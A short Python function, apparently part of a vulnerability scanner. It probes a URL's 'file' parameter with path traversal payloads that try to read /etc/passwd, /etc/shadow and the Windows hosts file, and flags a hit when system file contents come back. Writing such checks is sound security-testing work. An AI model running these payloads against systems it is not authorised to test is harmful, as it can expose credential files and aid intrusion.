import requests

def test_path_traversal(url):
    path_traversal_payloads = [
        "../../etc/passwd",  # Linux/Unix system file
        "../../windows/system32/drivers/etc/hosts",  # Windows system file
        "../../../../../../etc/shadow"
    ]

    for payload in path_traversal_payloads:
        try:
            response = requests.get(url, params={'file': payload}, timeout=5)
            if "root:" in response.text or "127.0.0.1" in response.text:
                return {"vulnerability": "Path Traversal", "status": "Detected",
                        "details": f"Payload {payload} exposed sensitive data"}
        except requests.exceptions.RequestException as e:
            pass
    return {"vulnerability": "Path Traversal", "status": "Not detected"}